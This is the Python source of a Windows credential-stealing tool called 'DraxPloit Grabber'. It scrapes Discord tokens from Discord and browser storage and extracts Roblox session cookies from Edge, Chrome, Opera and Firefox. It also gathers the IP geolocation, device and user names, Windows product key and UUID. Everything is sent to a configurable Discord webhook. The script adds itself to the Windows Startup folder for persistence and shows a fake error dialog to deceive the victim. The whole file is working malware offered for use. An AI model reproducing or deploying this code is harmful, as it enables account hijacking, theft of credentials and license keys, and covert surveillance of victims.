import browser_cookie3
import requests
import os
import asyncio
import platform
import subprocess
import re
import ctypes

from discord_webhook import DiscordWebhook,DiscordEmbed
from typing import Union
from sys import argv
from shutil import copy2

__config__ = {
    'yourwebhookurl': "%WEBHOOK_HERE%",
    'startup': '%_startup_enabled%',
    'fakeerror': '%fake_error_enabled%',
    'fakeerrorcustom': '%fake_error_text%',
}

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

class Exploit:
    def __init__(self):
        self.api = "https://ipinfo.io/json"
        self.log = ""
        self.w3bh00k = self.fetch_conf('yourwebhookurl')
        self.startupexe = self.fetch_conf("startup")
        self.fakeerror = self.fetch_conf("fakeerror")
        self.fakeerrorcustom = self.fetch_conf("fakeerrorcustom")
        self.robloxcookies = []
        self.avatarURL = "https://avatars.githubusercontent.com/u/79086740?v=4"

    def fetch_conf(self, e: str) -> Union[str, bool]:
        return __config__.get(e)

    def getData(self):
        stats = requests.get(self.api)
        json_stats = stats.json()
        ip = json_stats["ip"]
        city = json_stats["city"]
        region = json_stats["region"]
        country = json_stats["country"]
        timezone = json_stats["timezone"]
        org = json_stats["org"]

        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            uuidwndz = "N/A"
        try:
            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            w1nk33y = "N/A"
        try:
            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            w1nv3r = "N/A"
        try:
            deviceName, deviceUser = subprocess.check_output(['whoami'], creationflags=flag).decode('utf-8').strip().split('\\') if '\\' in subprocess.check_output(['whoami'], creationflags=flag).decode('utf-8').strip() else ('', '')
            deviceName = deviceName.upper()
        except Exception:
            deviceName = "N/A"
            deviceUser = "N/A"

            
        self.log = f"**DraxPloit Grabber** beamed a **NEW** user: ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"

    def sendMainData(self):
        data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
        requests.post(self.w3bh00k, json = data)

    def edgeLog(self):
        try:
            cookies = browser_cookie3.edge(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def chromeLog(self):
        try:
            cookies = browser_cookie3.chrome(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def operaLog(self):
        try:
            cookies = browser_cookie3.opera(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def firefoxLog(self):
        try:
            cookies = browser_cookie3.firefox(domain_name="roblox.com")
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            self.robloxcookies.append(cookie)
        except:
            pass

    def sendCookieLog(self):
        if self.robloxcookies:
            data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
            requests.post(self.w3bh00k, json = data)

    def mainTokenProcess(self):
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message = f'\nDiscord Token found on **{platform}** Browser:\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

            data = {"content": message, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
            requests.post(self.w3bh00k, json = data)

    def error_fake(self):
        if self.fakeerror == "yes":
            if "fake_error_text" in self.fakeerrorcustom:
                ctypes.windll.user32.MessageBoxW(None, '"notepad.exe" failed to launch. (Debug output: Notepad_0x827394)', 'Fatal Error', 0)
            else:
                ctypes.windll.user32.MessageBoxW(None, f'{self.fakeerrorcustom}', 'Fatal Error', 0)
            
    def credits(self):
        embed = DiscordEmbed(
            title="{title}",
            description="{description}",
            color="7289da"
        )

        embed.set_author(name="{author_name}", icon_url="{author_icon_url}")
        embed.set_footer(text="{footer_text}")

        embed.title = "DraxPloit Grabber"
        embed.description = "DraxPloit Grabber is scripted only by me, Drax"
        embed.set_author(name="Drax#5934", icon_url="http://pixelartmaker-data-78746291193.nyc3.digitaloceanspaces.com/image/f253a7d09b602f4.png")
        embed.set_footer(text="https://github.com/DraxFM/DraxPloit-Grabber")

        wb2 = DiscordWebhook(url=self.w3bh00k, username="DraxPloit Grabber Notifier", avatar_url=self.avatarURL)
        wb2.add_embed(embed)
        res = wb2.execute()
        

if __name__ == "__main__" and platform.system() == "Windows":
    exploit = Exploit()

    if exploit.startupexe == "yes":
        startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        fileName = os.path.split(argv[0])[1]
        if os.path.exists(startup_path + fileName):
            pass
        else:
            copy2(argv[0], startup_path)

    exploit.getData()
    exploit.sendMainData()

    exploit.firefoxLog()
    exploit.operaLog()
    exploit.chromeLog()
    exploit.edgeLog()
    exploit.sendCookieLog()

    exploit.mainTokenProcess()

    exploit.credits()

    exploit.error_fake()
